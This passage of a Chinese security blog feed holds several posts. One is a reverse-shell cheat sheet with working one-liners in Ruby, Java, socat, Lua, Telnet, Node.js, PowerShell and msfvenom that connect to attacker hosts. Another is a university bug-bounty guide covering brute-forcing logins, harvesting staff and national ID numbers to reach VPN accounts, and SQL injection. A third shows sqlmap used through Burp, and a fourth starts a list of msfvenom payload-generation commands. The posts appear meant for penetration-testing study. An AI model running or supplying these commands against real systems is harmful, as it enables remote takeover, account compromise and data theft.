class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不依赖于/bin/sh的反弹shell</p><pre class="line-numbers language-ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果目标系统运行Windows反弹shell</p><pre class="line-numbers language-ruby"><code class="language-ruby">ruby <span class="token operator">-</span>rsocket <span class="token operator">-</span>e <span class="token string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Java反弹shell"><a href="#Java反弹shell" class="headerlink" title="Java反弹shell"></a>Java反弹shell</h3><pre class="line-numbers language-java"><code class="language-java">r <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> p <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> <span class="token operator">*</span><span class="token operator">*</span>as<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">*</span><span class="token operator">*</span>String<span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="socat反弹shell"><a href="#socat反弹shell" class="headerlink" title="socat反弹shell"></a>socat反弹shell</h3><pre class="line-numbers language-scala"><code class="language-scala">socat exec<span class="token operator">:</span><span class="token string">'bash -li'</span><span class="token punctuation">,</span>pty<span class="token punctuation">,</span>stderr<span class="token punctuation">,</span>setsid<span class="token punctuation">,</span>sigint<span class="token punctuation">,</span>sane tcp<span class="token operator">:</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">79.137</span><span class="token operator">:</span><span class="token number">5555</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Lua反弹shell"><a href="#Lua反弹shell" class="headerlink" title="Lua反弹shell"></a>Lua反弹shell</h3><p>Linux</p><pre class="line-numbers language-lua"><code class="language-lua">lua <span class="token operator">-</span>e <span class="token string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows</p><pre class="line-numbers language-lua"><code class="language-lua">lua5<span class="token punctuation">.</span><span class="token number">1</span> <span class="token operator">-</span>e <span class="token string">'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, '</span>r<span class="token string">') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">rm</span> -f /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> telnet ATTACKING-IP 80 0/tmp/p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取反弹shell后，可使用python获得交互式shell</p><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c<span class="token string">'import pty; pty.spawn("/bin/bash")'</span> python <span class="token operator">-</span>c <span class="token triple-quoted-string string">''' import pty while(1):   try:     pty.spawn("/bin/bash")   except :     contiune'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Nodejs反弹shell"><a href="#Nodejs反弹shell" class="headerlink" title="Nodejs反弹shell"></a>Nodejs反弹shell</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token operator">**</span><span class="token keyword">function</span><span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token operator">**</span><span class="token keyword">var</span><span class="token operator">**</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">**</span><span class="token keyword">var</span><span class="token operator">**</span> client <span class="token operator">=</span> <span class="token operator">**</span><span class="token keyword">new</span><span class="token operator">**</span> net<span class="token punctuation">.</span><span class="token function">Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">,</span> <span class="token string">"10.17.26.64"</span><span class="token punctuation">,</span> <span class="token operator">**</span><span class="token keyword">function</span><span class="token operator">**</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>    sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">**</span><span class="token keyword">return</span><span class="token operator">**</span> <span class="token regex">/a/</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">// Prevents the Node.js application form crashing*})(); **or** require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') **or** -**var** x = global.process.mainModule.require-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash') **or** https:*//gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="C反弹shell"><a href="#C反弹shell" class="headerlink" title="C反弹shell"></a>C反弹shell</h3><pre class="line-numbers language-c"><code class="language-c">$ gcc c_revese_shell<span class="token punctuation">.</span>c <span class="token operator">-</span>o cshell$ <span class="token punctuation">.</span><span class="token operator">/</span>cshell <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.128</span> <span class="token number">8080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="UDP反弹shell"><a href="#UDP反弹shell" class="headerlink" title="UDP反弹shell"></a>UDP反弹shell</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token operator">*</span><span class="token comment" spellcheck="true">// 注意这里务必要用udp的模式来接*</span>$ nc <span class="token operator">-</span>l <span class="token operator">-</span>p <span class="token number">53</span> <span class="token operator">-</span>u$ python udpshell<span class="token punctuation">.</span>py <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.128</span> <span class="token number">53</span> udp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="MSF生成反弹shell"><a href="#MSF生成反弹shell" class="headerlink" title="MSF生成反弹shell"></a>MSF生成反弹shell</h3><p><a href="https://www.uedbox.com/?s=metasploit" target="_blank" rel="noopener">metasploit</a> 是一个非常强大的渗透工具箱，当然也包括了反弹语句的生成与接收反弹shell的平台。它也能生成反弹shell<a href="https://www.uedbox.com/post/6051/" target="_blank" rel="noopener">一句话</a>。</p><pre class="line-numbers language-makefile"><code class="language-makefile">msf > msfvenom -l payloads <span class="token string">'cmd/unix/reverse'</span> <span class="token operator">|</span> grep unix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msfvenom 有点类似于生成的语句，当然这个工具还可以用来生成<a href="https://www.uedbox.com/?s=shellcode" target="_blank" rel="noopener">shellcode</a>之类的。-l 是查找所有的pyaloads。cmd/unix/reverse 是关键词过滤。为了找到攻击debain的语句，就加了个正则。</p><p><strong>生成bash反弹shell</strong></p><pre><code>## 首先查看命令的参数msf &gt; msfvenom -p cmd/unix/reverse_netcat --list-options&gt;&gt; LPORT &gt;&gt; LHOSTmsfvenom -p cmd/unix/reverse_bash lhost=192.168.79.127 lport=5555</code></pre><h3 id="WIndows反弹shell补充"><a href="#WIndows反弹shell补充" class="headerlink" title="WIndows反弹shell补充"></a>WIndows反弹shell补充</h3><p>除了上面这些可以通用的语言反弹shell之外，可能最重要的就是powershell了，当然还有vbs（2003以下的系统），所以Windows反弹shell还是非常重要的技能。</p><pre class="line-numbers language-powershell"><code class="language-powershell">*<span class="token operator">/</span><span class="token operator">/</span> 可能是因为cmd默认的字符集<span class="token namespace">[gbk]</span>所以才会乱码<span class="token punctuation">,</span>如果是英文系统就不会了<span class="token operator">*</span>$ powershell –exec bypass –Command <span class="token string">"&amp; {Import-Module 'C:\mini-reverse.ps1'}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="powercat反弹shell，其实就是powershell版的netcat"><a href="#powercat反弹shell，其实就是powershell版的netcat" class="headerlink" title="powercat反弹shell，其实就是powershell版的netcat"></a>powercat反弹shell，其实就是powershell版的netcat</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token function">Set</span><span class="token operator">-</span>ExecutionPolicy UnrestrictedPS C:\> cd <span class="token punctuation">.</span>\powercatPS C:\powercat> <span class="token function">Import-Module</span> <span class="token punctuation">.</span>\powercat<span class="token punctuation">.</span>ps1PS C:\powercat> powercat <span class="token operator">-</span>c 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>128 <span class="token operator">-</span>p 8080 <span class="token operator">-</span>e cmd <span class="token operator">-</span>g >> payload<span class="token punctuation">.</span>ps1C:\>nc <span class="token operator">-</span>lvp 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后,把payload.ps1丢到目标机器上去执行</p><pre class="line-numbers language-powershell"><code class="language-powershell">powershell –exec bypass –Command <span class="token string">"&amp; {Import-Module 'C:\payload.ps1'}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><ul><li><a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener">https://github.com/lukechilds/reverse-shell</a></li><li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell Cheatsheet.md)</li></ul><h3 id="ew网络穿透工具反弹Shell"><a href="#ew网络穿透工具反弹Shell" class="headerlink" title="ew网络穿透工具反弹Shell"></a>ew网络穿透工具反弹Shell</h3><p><a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p><h3 id="frp网络穿透工具反弹Shell"><a href="#frp网络穿透工具反弹Shell" class="headerlink" title="frp网络穿透工具反弹Shell"></a>frp网络穿透工具反弹Shell</h3><p><a href="https://github.com/fatedier/frp/releases/tag/v0.36.2" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/tag/v0.36.2</a></p><hr><p>原文连接：<a href="https://www.uedbox.com/post/54632/" target="_blank" rel="noopener">https://www.uedbox.com/post/54632/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>edusrc挖掘思路</title>
      <link href="/posts/19d2a2l4.html"/>
      <url>/posts/19d2a2l4.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一月份的时候偶然注意到edusrc,起初是抱着学习的心态去挖几个洞，可是后面发现有证书，而且还贼好看，于是我动了凡心，一顿操作也拿了几本，广西民大、山东理工、同济，未到的有浙大、上海理工，证书要求证书图片可以在我个人博客看：<a href="http://mirrors.ren/rongyv/#toc-heading-14" target="_blank" rel="noopener">XingHe</a>，作用嘛，那当然是养眼，也可以在简历中写，我挖了大概两个月，有空就挖，后面收手了，只是觉得有代表就好了，要太多没用，大家不要学我哦，接下来我分享一下我挖edusrc的思路。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>大致思路就是信息搜集，如确定资产，比如他有哪些域名、子域名、C段、旁站、系统、微信小程序或公众号确定好站点或者目标系统之后，就是常规的指纹识别像中间件、网站，扫目录，后台，确定功能然后分析每个功能点上会有哪些漏洞，就比如一个登录页面，我们可以考虑的是爆破账号密码，社工账号密码（但鉴于博主心地善良，社工后内心会煎熬，所以目前没社工要账号密码，sql注入，xss漏洞，逻辑漏洞绕过。</p><h2 id="系统账号"><a href="#系统账号" class="headerlink" title="系统账号"></a>系统账号</h2><p>搞edusrc我们一般首要目标得拿到一个vpn或者统一身份认证的账号密码，因为很多系统都基于这个账号密码的单点登录，有两种一种是学生的，一种是教职工的，一般来说教职工的账号权限会比学生大很多，系统也多。怎么获得呢，你有朋友可以直接和朋友要，能省很多事情，不能就看看弱口令，搜集到学号和身份证号，有些学校会不经意间暴露出来，或者通过其他的系统，一些系统登录账号密码都是弱口令或者学号、工号，我们进去后在个人信息处会有身份证号，然后就能登录vpn或者统一身份认证。</p><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><p>然后我们来说一下一些能中危又常见的漏洞<br>1、弱口令，是管理员权限的弱口令<br>2、越权，这个是比较常见的，修改参数即可越权到别人的身份<br>3、sql注入，只要细心一点，sql注入也是比较常见的，只要能注出数据库就行了，搞太深不建议，可能会惹祸上身<br>4、文件上传，这类有一些老系统没设置什么限制，直接可以传文件<br>5、struts2漏洞，该框架有许多命令执行漏洞，可以用工具进行检测，工具链接: <a href="http://pan.baidu.com/s/1jIGWW8u" target="_blank" rel="noopener">http://pan.baidu.com/s/1jIGWW8u</a> 密码: e54e<br>6、shiro命令执行，也是java框架漏洞，<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit</a><br>7、任意文件包含，注意下载的链接修改下载文件的路径，像/etc/passwd,WEB-INF/web.xml等文件<br>8、逻辑漏洞，像任意密码修改或者其他组件漏洞编辑器插件的，能上传文件或者getshell<br>9、其他的漏洞，top10的危害的评定规则具体看官网</p><h1 id="实战分享"><a href="#实战分享" class="headerlink" title="实战分享"></a>实战分享</h1><p>取自某证书站的系统挖掘漏洞，现已修复，但为了不必要的麻烦敏感地方会打码</p><h2 id="1、确定目标，语法：site-xxxx-edu-cn"><a href="#1、确定目标，语法：site-xxxx-edu-cn" class="headerlink" title="1、确定目标，语法：site:xxxx.edu.cn"></a>1、确定目标，语法：site:xxxx.edu.cn</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509202357427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="2、账号密码组成我们知道了，谷歌语法查找工号"><a href="#2、账号密码组成我们知道了，谷歌语法查找工号" class="headerlink" title="2、账号密码组成我们知道了，谷歌语法查找工号"></a>2、账号密码组成我们知道了，谷歌语法查找工号</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509202559185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="3、爆破登录系统"><a href="#3、爆破登录系统" class="headerlink" title="3、爆破登录系统"></a>3、爆破登录系统</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509202822177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="4、确定功能，抓具体的url"><a href="#4、确定功能，抓具体的url" class="headerlink" title="4、确定功能，抓具体的url"></a>4、确定功能，抓具体的url</h2><p>点击抓包<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509202936773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509203037538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="5、添加单引号，报错，是mssql"><a href="#5、添加单引号，报错，是mssql" class="headerlink" title="5、添加单引号，报错，是mssql"></a>5、添加单引号，报错，是mssql</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509203144696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="6、报数据库版本，到这一步就可以交了，已经是中危了"><a href="#6、报数据库版本，到这一步就可以交了，已经是中危了" class="headerlink" title="6、报数据库版本，到这一步就可以交了，已经是中危了"></a>6、报数据库版本，到这一步就可以交了，已经是中危了</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20210509203238661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这个是比较简单也是比较常见的edusrc的挖掘方法，其他的案例就不分享了，有空再写，忙里偷闲的的写博客~<br>要是各位师傅有什么问题或者想一起学习交流的也可以留言哦~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> EDUSRC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp+sqlmap联动</title>
      <link href="/posts/19d2a2m0.html"/>
      <url>/posts/19d2a2m0.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h2><p>之前测试 sql 注入的时候很多平台中的很多查询功能都类似，于是通常就只测第一个功能，如果有问题，报告中就加一句类似此功能请逐一检查并修复。如果没问题，就直接过了。</p><p>那么这样测合适么，答案是否定的。一个系统不可能是一个人开发的，多人开发就可能会出现第一个没问题，第二个类似功能却有问题了。那么，逐一测么，这个问题不讨论，看情况。</p><p>通常怎么测的呢，burp 拦截包后，在 sqlmap 目录下新建一个文本文档叫个 1.txt，然后复制进去 sqlmap -r 跑一下，后来，需要测的多了，我就开始再建一个 2.txt，然后再开一个 sqlmap 跑，这个方法不知道有多少人试过，感觉很繁琐。</p><p>后来为了找一个方便的插件，我就去 burp 的插件市场下载了一个 sqlipy 的插件，当是我点 scan 扫描的时候一直扫不出结果，后来就放弃了。换了一个 Co2 的插件，用 owasp 测试的，有一个注入类型没有检测到，调用 sqlmap 理论不应该的，后来就又放弃了。于是就又试 sqlmap 插件，后来能用，就留下了，burp 中直接右键 send to sqlmap 就行，也挺方便，如果有好插件推荐欢迎留言讨论。</p><h2 id="0x01：使用"><a href="#0x01：使用" class="headerlink" title="0x01：使用"></a>0x01：使用</h2><p>首先下载 python 然后配置环境变量，需要用 python2，3 不支持 sqlmap，那么有必要卸载 3 装 2 么，没有。你可以两个都装上。</p><p>其次下载 sqlmap 配置环境变量，确保 burp 调用 sqlmap 能成功调用。</p><p>最后去下载 sqlmap.jar，github 的地址是 <a href="https://github.com/difcareer/sqlmap4burp" target="_blank" rel="noopener">https://github.com/difcareer/sqlmap4burp</a>, 不过下载下来的是 source，需要编译成 jar 文件，如果嫌麻烦，可以去搜现成的直接用。</p><p>随后导入 burp 中，位置是：extender-extensions-add - 选择 sqlmap.jar 即可，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLTEyNTE4MTYwOTguY29zLmFwLWJlaWppbmcubXlxY2xvdWQuY29tLzIwMTgwODIyMDEucG5n?x-oss-process=image/format,png" alt=""></p><p>然后就会多出来 sqlmap 一栏，点开后只有一个框，这个是添加 sqlmap 参数的，这个后面说。导入后随便拦截一个数据包，然后右键会有一个 send to sqlmap 选项，点击后会直接调用 sqlmap 进行扫描。</p><p>原理是会在临时目录下创建一个临时文本文件，然后把数据包存到了这个文本文件中，扫描时 - r 后面跟的就是这个文本文件，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLTEyNTE4MTYwOTguY29zLmFwLWJlaWppbmcubXlxY2xvdWQuY29tLzIwMTgwODIyMDIucG5n?x-oss-process=image/format,png" alt=""></p><p>随后会调用 cmd 去执行 sqlmap.py -r 文本文件这个命令，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLTEyNTE4MTYwOTguY29zLmFwLWJlaWppbmcubXlxY2xvdWQuY29tLzIwMTgwODIyMDMucG5n?x-oss-process=image/format,png" alt=""></p><p>文件是以 req 结尾了，这个是没问题的，可以扫描，查看的时候直接选择一些代码编辑器都能打开。那这个临时文件扫完后会被删除么，答案是不会，所以定期清理这个目录, 其中 AppData 是隐藏文件夹，需要显示一下才能查看。</p><h2 id="0x02：拓展"><a href="#0x02：拓展" class="headerlink" title="0x02：拓展"></a>0x02：拓展</h2><p>先说一下碰到的问题，sqlmap 加入环境变量中后，cmd 下 sqlmap.py 是可以正常运行的，burp send to sqlmap 就不行了，会提示没有找到这个命令不是内部程序。</p><p>解决办法是把系统中的 python 环境变量和 sqlmap 环境变量同样在 administrator 中设置一份，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLTEyNTE4MTYwOTguY29zLmFwLWJlaWppbmcubXlxY2xvdWQuY29tLzIwMTgwODIyMDQucG5n?x-oss-process=image/format,png" alt=""></p><p>设置往后重启生效。为什么系统环境变量没有生效而 administrator 生效了，可以理解成 burp 调用 sqlmap 和 python 时，用的是当前用户 administrator 的环境变量而不是系统的。</p><p>再说一下 sqlmap 插件之前说到的那个框，你会发现 sqlmap 插件执行的是一个基本的命令只有一个 - r 参数，如果有特殊需求怎么办，例如 - level 5，这时候打开这个框输入 - level 5 然后保存就可以了，再次运行插件的时候这个参数就会加上，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9ibG9nLTEyNTE4MTYwOTguY29zLmFwLWJlaWppbmcubXlxY2xvdWQuY29tLzIwMTgwODIyMDUucG5n?x-oss-process=image/format,png" alt=""></p><p>最后，再说一下注入复测时的问题，当一个注入点被测出来后，开发去修改，改好后再复测依然存在，可是开发修了，参数化查询了，特殊符号也过滤了，那么可能就是缓存的问题，怎么判断？</p><p>没有扫描过程，直接输出注入点 payload 就是缓存，sqlmap 扫描时会先去自己的扫描记录里过一遍，有记录的话就会直接出记录的结果，这个目录在 C:UsersAdministrator.sqlmapoutput 中，里面都是以文件夹方式存放的之前的扫描项目，删除即可。或者用参数 –purge-output，清除所有的记录。</p><h2 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h2><p>虽然说常规的跨站注入等漏洞没以前多了，但是现在依然不少，能导致注入的原因也有很多，有时候查询参数多了，即使有经验的开发也会有参数遗漏，所以 sql 注入依然没有老，尽管没有当初年轻了。</p><hr><p>转载于:<a href="https://blog.csdn.net/fageweiketang/article/details/81951670" target="_blank" rel="noopener">https://blog.csdn.net/fageweiketang/article/details/81951670</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BurpSuite </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF命令大全详解</title>
      <link href="/posts/19d2a2w8.html"/>
      <url>/posts/19d2a2w8.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-0-0x00-payload生成："><a href="#1-0-0x00-payload生成：" class="headerlink" title="1 | 0     0x00 payload生成："></a>1 | 0     0x00 payload生成：</h2><h3 id="1-1-Windows-Linux"><a href="#1-1-Windows-Linux" class="headerlink" title="1 | 1     Windows.Linux"></a>1 | 1     Windows.Linux</h3><pre><code>Windows：msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f exe &gt; 保存路径/文件名Linux:msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -f elf &gt; 保存路径/文件名</code></pre><h3 id="1-2-Web"><a href="#1-2-Web" class="headerlink" title="1 | 2     Web"></a>1 | 2     Web</h3><pre><code>PHP:msfvenom -p php/meterpreter_reverse_tcp lhost=[你的IP] lport=[端口] -f raw &gt; 保存路径/文件名.phpASP:msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口]-f asp &gt; 保存路径/文件名.asp JSP: msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f raw &gt; 保存路径/文件名.jsp WAR: msfvenom -p 